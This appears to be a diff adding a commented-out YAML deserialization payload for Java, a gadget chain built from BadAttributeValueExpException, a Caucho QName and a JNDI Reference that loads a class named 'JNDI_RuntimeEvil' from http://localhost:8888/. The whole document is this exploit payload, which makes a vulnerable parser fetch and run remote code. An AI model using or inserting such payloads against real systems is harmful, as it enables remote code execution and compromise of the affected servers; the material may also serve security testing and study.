@@ -1,0 +1,10 @@
+#!!javax.management.BadAttributeValueExpException
+#  {val: !!com.caucho.naming.QName
+#    {context: javax.naming.spi.DirectoryManager
+#      first: "_items1"
+#      rest: "_items2"}
+#      _cpe: !!javax.naming.CannotProceedException
+#      resolvedObj: !!javax.naming.Reference
+#       className: "JNDI_RuntimeEvil"
+#       factory: "JNDI_RuntimeEvil"
+#       factoryLocation: "http://localhost:8888/"}}
